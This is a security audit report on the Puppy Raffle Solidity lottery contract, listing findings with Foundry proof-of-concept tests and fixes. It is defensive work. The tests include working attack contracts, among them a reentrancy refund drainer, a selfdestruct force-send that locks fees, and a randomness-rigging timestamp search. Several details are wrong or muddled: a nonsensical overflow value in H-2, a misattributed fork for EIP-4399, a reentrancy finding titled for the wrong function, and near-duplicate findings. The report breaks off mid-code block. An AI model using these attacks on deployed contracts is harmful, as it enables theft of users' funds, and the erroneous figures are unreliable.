# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### Puppy Raffle Protocol
Puppy Raffle is an on-chain lottery that mints a unique ERC-721 “puppy” NFT to one lucky entrant at fixed time intervals.

1. Entering
* Anyone calls `enterRaffle(address[] newPlayers)` and pays `entranceFee × newPlayers.length`.
* The function verifies payment, blocks duplicate addresses, and appends players to the `players` array.

2. Refunds
* Before a winner is drawn, any participant may recover their stake via `refund(playerIndex)`; the entry slot is deleted and the ETH returned.

3. Winner Selection
* After `raffleDuration` seconds have elapsed, anyone may trigger `selectWinner()`.
* A pseudo-random index chooses the winner, the pot is split: owner-defined `feeAddress` receives a percentage stored in `totalFees`, the remainder is sent to the winner.
* The contract mints an NFT to the winner; rarity (common/rare/legendary) is randomly assigned and mapped to metadata URIs.
* Player list is reset for the next round.

4. Fee Management
* Owner can `withdrawFees()` to send accumulated fees to `feeAddress` and can update that address via `changeFeeAddress()`.

The contract inherits `ERC721` and `Ownable`, runs on Solidity 0.7.6, and is fully self-contained—no external randomness oracle required.
## High Risk Findings
[H-1]. Randomness issue in PuppyRaffle::selectWinner
[H-2]. Integer Overflow issue in PuppyRaffle::selectWinner
[H-3]. Reentrancy issue in PuppyRaffle::refund
[H-4]. Array Limits issue in PuppyRaffle::selectWinner
[H-5]. Unchecked Return issue in PuppyRaffle::selectWinner
[H-6]. Gas Grief BlockLimit issue in PuppyRaffle::refund
[H-7]. Access Control issue in PuppyRaffle::withdrawFees
[H-8]. Reentrancy issue in PuppyRaffle::selectWinner
[H-9]. Pragma issue in PuppyRaffle::selectWinner
[H-10]. DOS issue in PuppyRaffle::enterRaffle
[H-11]. Unexpected Eth issue in PuppyRaffle::refund
[H-12]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[M-2]. Timestamp Dependent Logic issue in PuppyRaffle::enterRaffle
[M-3]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-4]. Unexpected Eth issue in PuppyRaffle::withdrawFees
## Low Risk Findings
[L-1]. Pragma issue in PuppyRaffle::NA
[L-2]. Gas Grief BlockLimit issue in PuppyRaffle::_isActivePlayer
[L-3]. Access Control issue in PuppyRaffle::changeFeeAddress
[L-4]. Event Consistency issue in PuppyRaffle::getActivePlayerIndex
## Info Risk Findings
[I-1]. Event Consistency issue in PuppyRaffle::withdrawFees


### Number of Findings
- H: 12
- M: 4
- L: 4
- I: 1



# High Risk Findings

## [H-1]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses easily manipulable variables for random number generation. It relies on `msg.sender`, `block.timestamp`, and `block.difficulty` (renamed to `prevrandao` in newer versions) which can be influenced by miners or validators.

```solidity
uint256 winnerIndex = uint256(
    keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))
) % players.length;
```

And later for puppy rarity:
```solidity
uint256 rarity = uint256(
    keccak256(abi.encodePacked(msg.sender, block.difficulty))
) % 100;
```

## Impact
Because anyone can call selectWinner(), the caller completely controls one of the three entropy sources (msg.sender) and can freely choose the exact second when the transaction is mined (block.timestamp) by simply waiting. This allows any participant to simulate the outcome off-chain for the upcoming seconds and only submit the transaction in a moment when the hash results in his own address being picked. Consequently the raffle can be deterministically won by a motivated attacker, resulting in loss of the prize pool for honest users and loss of protocol reputation.

## Proof of Concept
1. Off-chain, the attacker enumerates timestamps `t = raffleStartTime + raffleDuration + k` for k = 0 … 300.
2. For every t he computes `winnerIndex = uint256(keccak256(abi.encodePacked(attacker, t, prevrandao))) % players.length` where `prevrandao` can be observed from the parent block header.
3. As soon as he finds a timestamp that yields his own index, he submits (or bundles) the selectWinner() transaction with the chosen gas price so that it lands in that exact block.
4. No one can change the result afterwards because selectWinner() can only be called once per raffle and deletes the players array, therefore the attacker wins with 100 % certainty.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RandomnessExploitFixedTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address owner     = makeAddr("owner");
    address feeAddr   = makeAddr("fee");
    address attacker  = makeAddr("attacker");
    address[3] others = [makeAddr("p1"), makeAddr("p2"), makeAddr("p3")];

    function setUp() public {
        vm.prank(owner);
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeAddr, 1 days);

        // fund attacker with enough ETH to pay for all 4 entries
        vm.deal(attacker, ENTRANCE_FEE * 4);
        vm.prank(attacker);
        address[] memory players = new address[](4);
        for (uint256 i; i < 3; ++i) players[i] = others[i];
        players[3] = attacker; // attacker is last index (3)
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);

        // travel to earliest moment raffle can be finished
        vm.warp(block.timestamp + 1 days + 1);
    }

    function _calcIndex(address sender) internal view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(sender, block.timestamp, block.difficulty))) % 4;
    }

    function testAttackerCanGuaranteeWin() public {
        // attacker searches up to 120 future seconds
        for (uint256 i; i < 120; ++i) {
            vm.warp(block.timestamp + 1); // move 1 second
            if (_calcIndex(attacker) == 3) { // 3 == attacker index in array
                vm.prank(attacker);
                raffle.selectWinner();
                assertEq(raffle.balanceOf(attacker), 1, "attacker did not win even though pre-computed");
                return; // success
            }
        }
        fail("could not find winning second – test ran out of iterations");
    }
}

## Suggested Mitigation
Replace the current entropy construction with an oracle-based, verifiable source of randomness (e.g. Chainlink VRF, drand, EigenLayer AVS) or commit-reveal scheme in which neither the caller nor a single validator can bias the result. The randomness must be delivered after the raffle is closed and used exactly once to derive both winner index and rarity.

## [H-2]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function in the PuppyRaffle contract converts a uint256 fee value to uint64 when adding to totalFees. This can lead to integer overflow if the accumulated fees exceed the maximum value of uint64 (2^64 - 1).

```solidity
// In the selectWinner function
uint256 fee = (totalAmountCollected * 20) / 100;
totalFees = totalFees + uint64(fee);
```

When the fee amount added causes totalFees to exceed the maximum uint64 value, it will overflow and wrap around to a much smaller value, potentially resulting in significant fund loss.

## Impact
Because uint64 is incapable of holding values larger than 18 446 744 073 709 551 615, casting the per-raffle fee to uint64 can overflow as soon as a single raffle is run with entranceFee > 23 ether (given the minimum 4 players). When that happens `totalFees` is recorded as an erroneously small number while the real ETH remains in the contract. The safety check inside `withdrawFees()` (`address(this).balance == uint256(totalFees)`) will revert forever, permanently locking every wei of fee revenue in the contract. No ETH can be stolen, but an attacker can trigger an irreversible DoS of the fee pot at negligible cost, causing a direct financial loss to the protocol/owner.

## Proof of Concept
1. Deploy the contract with an `entranceFee` above 23 ether (e.g. 30 ether).
2. Any user supplies four different addresses and calls `enterRaffle` paying 120 ether.
3. After `raffleDuration` passes, anybody calls `selectWinner()`. Inside that function:
   fee = (4 * 30 ether * 20) / 100 = 24 ether > 2^64 ‑ 1,
   so `uint64(fee)` wraps to **5 543 244 800 ether - 24 ether** (i.e. `fee mod 2^64`).
4. `totalFees` now stores the wrapped, much smaller number while the contract actually holds 24 ether.
5. When the owner later calls `withdrawFees()` it reverts because `address(this).balance` (24 ether) ≠ `totalFees` (wrapped value). The fee balance is now stuck in the contract forever.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract OverflowFirstRaffleTest is Test {
    PuppyRaffle raffle;
    address owner = makeAddr("owner");
    address feeRecipient = makeAddr("feeRecipient");

    function setUp() public {
        vm.prank(owner);
        raffle = new PuppyRaffle(30 ether, feeRecipient, 1 days); // > 23 ether
    }

    function test_feeOverflowAfterOneRaffle() public {
        // prepare 4 distinct players
        address[] memory players = new address[](4);
        for (uint256 i; i < 4; i++) {
            players[i] = address(uint160(i + 1));
        }

        // fund and enter raffle
        vm.deal(address(this), 120 ether);
        raffle.enterRaffle{value: 120 ether}(players);

        // finish raffle
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();

        uint256 realFee = (4 * 30 ether * 20) / 100; // 24 ether
        uint64 recordedFee = raffle.totalFees();

        // recorded fee must have wrapped
        assertLt(recordedFee, uint64(realFee));
        // consequently withdrawFees must revert
        vm.prank(owner);
        vm.expectRevert();
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Use a uint256 instead of uint64 for the totalFees variable to prevent overflow. This provides sufficient capacity for storing fee values.

```solidity
// Change from uint64 to uint256
uint256 public totalFees = 0;

// In the selectWinner function, no need for casting
function selectWinner() external {
    // ... existing code
    
    uint256 fee = (totalAmountCollected * 20) / 100;
    // No need for casting since totalFees is now uint256
    totalFees = totalFees + fee;
    
    // ... rest of the function
}
```

Alternatively, if you must use uint64, implement checks to prevent overflow:

```solidity
// Add a SafeMath library for uint64
library SafeMath64 {
    function add(uint64 a, uint64 b) internal pure returns (uint64) {
        uint64 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
}

// In the contract
using SafeMath64 for uint64;

// In the selectWinner function
function selectWinner() external {
    // ... existing code
    
    uint256 fee = (totalAmountCollected * 20) / 100;
    // Check if fee can be safely converted to uint64
    require(fee <= type(uint64).max, "Fee too large for uint64");
    totalFees = totalFees.add(uint64(fee));
    
    // ... rest of the function
}
```

## [H-3]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function in the PuppyRaffle contract contains a reentrancy vulnerability. When a player requests a refund, the contract sends ether to the player before updating the players array to mark the player as refunded:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Send the refund
    payable(msg.sender).sendValue(entranceFee);
    
    // Update state AFTER sending refund
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

This violates the Check-Effects-Interactions pattern, allowing for potential reentrancy attacks.

## Impact
An attacker can call the refund function from a contract with a fallback function that calls refund again. This would allow them to drain the contract's funds by withdrawing their entrance fee multiple times before their player status is set to address(0). This is a direct theft of funds from the protocol.

## Proof of Concept
1. Deploy PuppyRaffle with an entranceFee of 1 ether.
2. Deploy ReentrancyAttacker passing the PuppyRaffle address.
3. The attacker contract enters the raffle then stores its `playerIndex`.
4. At least one additional honest user also enters so the contract holds >1 ether.
5. The attacker calls `attack()`, which triggers the first `refund()` call.
6. While the first `sendValue` transfer is in flight, the attacker’s `receive()` function re-enters `refund()` again with the same `playerIndex` because the player entry has not yet been zeroed out, allowing the same check to pass.
7. Steps 5-6 repeat until the contract balance is < entranceFee, draining deposits made by honest users and yielding the attacker a net profit.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

// Attacker contract used to trigger the re-entrancy
contract ReentrancyAttacker {
    PuppyRaffle public raffle;
    uint256 public index;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
    }

    function join(uint256 entranceFee) external payable {
        address[] memory arr = new address[](1);
        arr[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(arr);
        index = raffle.getActivePlayerIndex(address(this));
    }

    function attack() external {
        raffle.refund(index);
    }

    receive() external payable {
        if (address(raffle).balance >= raffle.entranceFee()) {
            raffle.refund(index);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle private raffle;
    ReentrancyAttacker private attacker;

    uint256 constant ENTRANCE_FEE = 1 ether;
    address constant FEE_ADDRESS = address(0xBEEF);
    uint256 constant DURATION = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, DURATION);

        // deploy and fund attacker
        attacker = new ReentrancyAttacker(raffle);
        vm.deal(address(attacker), ENTRANCE_FEE);
        vm.prank(address(attacker));
        attacker.join{value: ENTRANCE_FEE}(ENTRANCE_FEE);

        // add an honest user so contract holds extra ether
        address honest = address(0xCAFE);
        vm.deal(honest, ENTRANCE_FEE);
        address[] memory p = new address[](1);
        p[0] = honest;
        vm.prank(honest);
        raffle.enterRaffle{value: ENTRANCE_FEE}(p);
    }

    function testRefundReentrancy() public {
        uint256 contractBalanceBefore = address(raffle).balance;   // 2 ether
        uint256 attackerBalanceBefore = address(attacker).balance; // 0 ether

        vm.prank(address(attacker));
        attacker.attack();

        uint256 contractBalanceAfter = address(raffle).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;

        // attacker earned profit
        assertGt(attackerBalanceAfter, ENTRANCE_FEE);
        // contract lost more than a single refund amount
        assertLt(contractBalanceAfter, contractBalanceBefore - ENTRANCE_FEE);
    }
}

## Suggested Mitigation
Implement the Check-Effects-Interactions pattern by updating the contract state before making external calls. This prevents reentrancy attacks by ensuring that subsequent calls will fail the state checks.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Update state BEFORE sending funds
    players[playerIndex] = address(0);
    
    // Send the refund AFTER updating state
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}
```

Additionally, consider implementing a reentrancy guard:

```solidity
// Add a reentrancy guard
bool private _notEntered = true;

modifier nonReentrant() {
    require(_notEntered, "ReentrancyGuard: reentrant call");
    _notEntered = false;
    _;
    _notEntered = true;
}

function refund(uint256 playerIndex) public nonReentrant {
    // ... rest of the function
}
```

## [H-4]. Array Limits issue in PuppyRaffle::selectWinner

## Description
The `refund` function uses array indices to track players, and when a player is refunded, their address is set to `address(0)` rather than removing them from the array. This pattern leaves gaps in the array that can cause the `selectWinner` function to potentially select an empty slot (address(0)) as the winner.

```solidity
function refund(uint256 playerIndex) public {
    // ... checks ...
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

In the `selectWinner` function, the winner is selected using a random index, but there's no check that the selected address isn't `address(0)`:

```solidity
uint256 winnerIndex = uint256(
    keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))
) % players.length;

address winner = players[winnerIndex];
```

## Impact
After a participant is refunded, the players array still contains their slot, so players.length remains unchanged while 1 ether has been withdrawn from the contract. When selectWinner is later called it calculates totalAmountCollected = players.length * entranceFee and will attempt to pay out 80 % of that inflated value plus a 20 % fee. Because the real contract balance is smaller, the low-level call to transfer the prizePool inevitably fails and selectWinner reverts. No new winners can ever be picked and all funds that remain in the contract are permanently locked (denial-of-service). If, in addition, the pseudo-random index hits the empty slot, the call will try to send ether to address(0), compounding the loss.

## Proof of Concept
Scenario
1. Four players enter paying 1 ETH each – contract holds 4 ETH.
2. One player asks for a refund. Their slot becomes address(0) and the contract balance drops to 3 ETH, but players.length is still 4.
3. After raffleDuration anyone calls selectWinner.
4. totalAmountCollected is 4 ETH; prizePool = 3.2 ETH and fee = 0.8 ETH.
5. Contract only owns 3 ETH, so the low-level call that tries to send 3.2 ETH to the chosen winner reverts and selectWinner reverts with “PuppyRaffle: Failed to send prize pool to winner”. From this moment on the raffle is stuck and every further call to selectWinner will keep reverting.
6. If the pseudo-random index happens to be the refunded slot, the call is made to address(0), burning the ether even when the balance would have been sufficient.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RefundGapTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address feeReceiver = address(100);

    address p1 = address(1);
    address p2 = address(2);
    address p3 = address(3);
    address p4 = address(4);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeReceiver, 1 days);

        address[] memory players = new address[](4);
        players[0] = p1;
        players[1] = p2;
        players[2] = p3;
        players[3] = p4;

        vm.deal(address(this), 4 ether);
        raffle.enterRaffle{value: 4 ether}(players);

        // player p2 asks for a refund, empties slot 1 and withdraws his 1 ETH
        vm.prank(p2);
        raffle.refund(1);

        // advance time so the raffle can be finished
        vm.warp(block.timestamp + 2 days);
    }

    function testSelectWinnerRevertsBecauseOfGap() public {
        // Contract balance is 3 ETH, but selectWinner will try to transfer 3.2 ETH
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();
    }
}


## Suggested Mitigation
Always keep players.length equal to the number of funded participants. The simplest fix is to replace the refunded element with the last element and then pop() the array, as shown below:

```solidity
function refund(uint256 index) external {
    require(players[index] == msg.sender, "Not your slot");

    // pull last element forward to close the gap
    uint256 last = players.length - 1;
    if (index < last) {
        players[index] = players[last];
    }
    players.pop();

    Address.sendValue(payable(msg.sender), entranceFee);

    emit RaffleRefunded(msg.sender);
}
```

In addition, in selectWinner check that the selected slot is not address(0) (defensive coding), or compute the winner after constructing a compact array of active players.

## [H-5]. Unchecked Return issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function lacks a proper check to verify that the contract has enough balance to pay the winner. Instead, it calculates the prize pool based on the number of players and assumes the contract balance is sufficient, which may not be true if funds have been manipulated.

```solidity
function selectWinner() external {
    // ...
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);
    
    // No balance check before sending funds
    (bool success,) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    // ...
}
```

## Impact
Any refunded player is still counted in `players.length`, so `selectWinner()` over-estimates the prize pool. Because each refund already transferred the corresponding ETH out of the contract, the real balance becomes smaller than the computed `prizePool`. When `selectWinner()` is later called, the low-level send to the winner reverts, preventing the raffle from ever finishing and freezing all remaining funds indefinitely (DoS with locked funds).

## Proof of Concept
1. Four players enter the raffle paying 1 ETH each (total 4 ETH).
2. One of the players calls `refund()`. The contract balance drops to 3 ETH, but the slot in the `players` array is merely set to `address(0)`; `players.length` is still 4.
3. After the raffle duration passes, anyone calls `selectWinner()`.
4. `totalAmountCollected` is calculated as `4 * 1 ETH = 4 ETH` and `prizePool = 3.2 ETH`.
5. The contract only owns 3 ETH, therefore the `winner.call{value: prizePool}("")` fails and the whole transaction reverts.
6. Every future attempt will revert forever because the state (players array, start time) is not changed – the raffle is bricked and the remaining 3 ETH are locked.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract SelectWinnerBalanceTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant DURATION = 1 days;
    address feeAddress = address(0xFEE);

    address p1 = address(1);
    address p2 = address(2);
    address p3 = address(3);
    address p4 = address(4);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, DURATION);
        vm.deal(p1, 10 ether);
        vm.deal(p2, 10 ether);
        vm.deal(p3, 10 ether);
        vm.deal(p4, 10 ether);

        address[] memory entrants = new address[](4);
        entrants[0] = p1;
        entrants[1] = p2;
        entrants[2] = p3;
        entrants[3] = p4;

        // p1 funds all four entries for simplicity
        vm.prank(p1);
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(entrants);

        // p3 requests a refund
        uint256 idx = raffle.getActivePlayerIndex(p3);
        vm.prank(p3);
        raffle.refund(idx);

        // Fast-forward so the raffle can finish
        vm.warp(block.timestamp + DURATION + 1);

        // selectWinner() must revert because balance < prizePool
        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Exclude refunded / inactive entries when computing `totalAmountCollected`, or simply compute `prizePool` from `address(this).balance`:

```
uint256 contractBalance = address(this).balance;
uint256 prizePool = (contractBalance * 80) / 100;
uint256 fee       = contractBalance - prizePool; // always 20 %
```

Then update `totalFees += uint64(fee);` **before** transferring the prize, and require the transfer succeeds. Alternatively, clean the `players` array when a player refunds (use `pop()` or swap-and-pop) so `players.length` always reflects the actual amount of collected ETH.

## [H-6]. Gas Grief BlockLimit issue in PuppyRaffle::refund

## Description
The contract allows refunding entrance fees to players by setting their address to `address(0)` in the players array but doesn't reduce the array size. When looping through the players array later (in duplicate checks, winner selection, etc.), these "empty" slots are still processed, wasting gas.

```solidity
function refund(uint256 playerIndex) public {
    // ... validation checks ...
    
    payable(msg.sender).sendValue(entranceFee);
    
    // Set the player's address to 0
    players[playerIndex] = address(0);
    
    emit RaffleRefunded(playerAddress);
}
```

This also creates a potential DoS vulnerability as many refunded players will increase gas costs for all operations that iterate through the players array.

## Impact
Besides linear gas growth, leaving refunded slots set to address(0) makes it possible for `selectWinner()` to pick the zero address. Because `_safeMint(address(0), …)` reverts in OpenZeppelin’s ERC721, every such selection reverts the whole transaction. An attacker can create many zero slots (by entering, then refunding) so that the probability of reverting is close to 1, permanently blocking the raffle, locking prize money and fees, and preventing the owner from ever calling `withdrawFees()` (which is only possible after a successful raffle round). This is a permanent denial-of-service against the entire protocol.

## Proof of Concept
1. Attacker funds four EOAs and calls `enterRaffle()` with the four addresses, supplying 4 * entranceFee.
2. Three of the addresses immediately call `refund()`, leaving the players array as `[attacker, address(0), address(0), address(0)]`.
3. After `raffleDuration` has passed, anyone may call `selectWinner()`. 75 % of the time `winnerIndex` will point to one of the zero slots, causing `_safeMint(address(0), …)` to revert with "ERC721: mint to the zero address" and therefore reverting the entire call.
4. The attacker (or a bot) can repeatedly call `selectWinner()` until the block gas limit is reached, forcing every attempt to revert and keeping the raffle in a stuck state forever.
5. All ETH that participants paid remains locked in the contract together with the accumulated fees because a successful `selectWinner()` is required before the owner can withdraw fees.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ZeroWinnerDoSTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    address feeReceiver = address(99);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, feeReceiver, 1 hours);
    }

    function testSelectWinnerRevertsWhenZeroPicked() public {
        address p1 = address(1);
        address p2 = address(2);
        address p3 = address(3);
        address p4 = address(4);

        // fund contract caller
        vm.deal(address(this), 4 * FEE);
        raffle.enterRaffle{value: 4 * FEE}(toArray(p1, p2, p3, p4));

        // three players refund, leaving 3 zero entries
        vm.prank(p2); raffle.refund(1);
        vm.prank(p3); raffle.refund(2);
        vm.prank(p4); raffle.refund(3);

        // fast-forward time so raffle can be finished
        vm.warp(block.timestamp + 1 hours + 1);

        // find a timestamp that makes winnerIndex point to a zero slot
        uint256 playersLen = 4;
        uint256 targetTs = block.timestamp;
        for (uint256 i; i < 1000; ++i) {
            uint256 idx = uint256(keccak256(abi.encodePacked(address(this), targetTs + i, block.difficulty))) % playersLen;
            if (idx != 0) { // slots 1-3 are zero
                targetTs = targetTs + i;
                break;
            }
        }
        vm.warp(targetTs);

        vm.expectRevert(bytes("ERC721: mint to the zero address"));
        raffle.selectWinner();
    }

    function toArray(address a, address b, address c, address d) internal pure returns (address[] memory arr) {
        arr = new address[](4);
        arr[0] = a; arr[1] = b; arr[2] = c; arr[3] = d;
    }
}

## Suggested Mitigation
On refund, replace the refunded entry with the last element of `players` and `pop()` the array, or maintain a parallel mapping of active indexes. This guarantees that the array never contains address(0) entries, prevents unnecessary gas growth, and ensures `selectWinner()` can never pick an invalid address.

## [H-7]. Access Control issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function has an incorrect balance check that requires the contract's entire balance to match the `totalFees` value. However, if there are active players in the raffle, the contract balance will include both fees and entrance fees from the active players, causing this check to fail.

```solidity
function withdrawFees() external {
    require(
        address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!"
    );
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

The error message is also misleading as it implies there are players active when the real issue might be a balance mismatch for other reasons.

## Impact
Anyone can permanently brick the fee-withdrawal mechanism by forcibly sending an arbitrary amount of ether (e.g. via self-destruct) to the contract. Because `withdrawFees` requires `address(this).balance == totalFees`, any unexpected wei makes the equality impossible to satisfy in practice (fees are always multiples of 20% of the entrance fee). This locks the whole fee pot forever, even when no players are active, causing an unrecoverable loss of funds for the protocol owner.

## Proof of Concept
1. Complete a raffle normally so that `totalFees > 0` and no players remain.
2. Attacker deploys a helper contract, funds it with 1 wei and calls `selfdestruct(targetRaffleAddress)`. One wei is forcibly sent to `PuppyRaffle`.
3. `address(this).balance` in `PuppyRaffle` is now `totalFees + 1`.
4. Owner (or anyone) calls `withdrawFees()`. The `require(address(this).balance == totalFees)` check fails, reverting forever because `totalFees` can only change in 20 % entrance-fee increments and will almost never match the extra 1 wei.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ForceSend {
    constructor() payable {}
    function attack(address payable target) external {
        selfdestruct(target); // force-send balance
    }
}

contract WithdrawFeesDoSTest is Test {
    PuppyRaffle raffle;
    address owner = address(1);
    address feeAddr = address(2);
    uint256 entrance = 1 ether;

    function setUp() public {
        vm.prank(owner);
        raffle = new PuppyRaffle(entrance, feeAddr, 1 days);

        // run one successful raffle so totalFees > 0 and no active players
        address[] memory p = new address[](4);
        p[0]=address(10);p[1]=address(11);p[2]=address(12);p[3]=address(13);
        vm.deal(address(this), 4*entrance);
        raffle.enterRaffle{value: 4*entrance}(p);
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();
        // sanity-check invariant holds before the attack
        assertEq(address(raffle).balance, raffle.totalFees());
    }

    function testForcedEtherBricksWithdraw() public {
        // attacker force-sends 1 wei
        ForceSend fs = (new ForceSend){value: 1 wei}();
        fs.attack(payable(address(raffle)));
        assertEq(address(raffle).balance, raffle.totalFees() + 1);

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Remove the fragile equality check and instead verify that enough balance exists: `require(address(this).balance >= totalFees, "insufficient balance");`. Then allow withdrawal of `totalFees` (or make it onlyOwner). This prevents both active-player and forced-ether griefing while keeping funds safe.

## [H-8]. Reentrancy issue in PuppyRaffle::selectWinner

## Description
The contract is vulnerable to reentrancy attacks in multiple functions that send ETH before updating state variables. For example, in the `selectWinner` function, the prize is sent to the winner before resetting critical state variables:

```solidity
function selectWinner() external {
    // ... code to determine winner and prize ...
    
    // Send prize to winner before updating state
    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    
    // State updates happen after external call
    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
    
    // Mint NFT
    _safeMint(winner, tokenId);
}
```

This pattern is also present in the `refund` function, where the ETH is sent before updating the player's status.

## Impact
Because refund() transfers the entranceFee to msg.sender before it sets players[playerIndex] = address(0), a malicious contract can repeatedly re-enter refund() from its receive() function and collect the same refund many times. The attacker’s total profit is limited only by the contract balance (all entrance fees that are still held), allowing full theft of users’ funds and preventing honest players from getting their money back.

## Proof of Concept
1. Malicious contract joins the raffle once.
2. It calls refund(itsIndex).
3. refund() sends entranceFee to the contract; during the low-level call the attacker re-enters refund(itsIndex) again because its entry is still present.
4. Steps 2-3 repeat several times; only the outer-most call will finally zero the slot, so the attacker receives entranceFee * (re-entry depth).
5. Net profit > entranceFee, funds drained from PuppyRaffle.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RefundReentrancyAttacker {
    PuppyRaffle public raffle;
    uint256 public idx;
    uint8 private counter;
    uint8 constant MAX_REENTER = 3; // receives refund 4 times in total

    constructor(PuppyRaffle _raffle, uint256 _idx) {
        raffle = _raffle;
        idx = _idx;
    }

    function attack() external {
        raffle.refund(idx);
    }

    receive() external payable {
        if (counter < MAX_REENTER) {
            counter++;
            raffle.refund(idx);
        }
    }
}

contract RefundReentrancyTest is Test {
    uint256 constant FEE = 1 ether;
    PuppyRaffle raffle;
    RefundReentrancyAttacker attacker;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(this), 1 weeks);

        // deploy attacker and prepare player list
        attacker = new RefundReentrancyAttacker(raffle, 0);
        address[] memory players = new address[](1);
        players[0] = address(attacker);

        vm.deal(address(attacker), FEE);
        vm.prank(address(attacker));
        raffle.enterRaffle{value: FEE}(players);
    }

    function testRefundReentrancy() public {
        uint256 beforeBal = address(attacker).balance;

        vm.prank(address(attacker));
        attacker.attack();

        uint256 gained = address(attacker).balance - beforeBal;
        assertEq(gained, FEE * 4, "attacker should receive the refund four times");
    }
}

## Suggested Mitigation
Apply Checks-Effects-Interactions in refund():

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "Only the player can refund");
    require(playerAddress != address(0), "Already refunded or inactive");

    // effects
    players[playerIndex] = address(0);

    // interaction
    payable(msg.sender).sendValue(entranceFee);

    emit RaffleRefunded(playerAddress);
}

Additionally, inheriting from OpenZeppelin ReentrancyGuard and adding the nonReentrant modifier to refund() (and to withdrawFees()) adds a second line of defence.

## [H-9]. Pragma issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses `block.difficulty` as a source of randomness, which was deprecated in the London hard fork (EIP-4399) and replaced with `block.prevrandao` in the Merge. The contract uses Solidity 0.7.6, which predates these changes, making the randomness source potentially unreliable on newer networks.

```solidity
uint256 winnerIndex = uint256(
    keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))
) % players.length;
```

and

```solidity
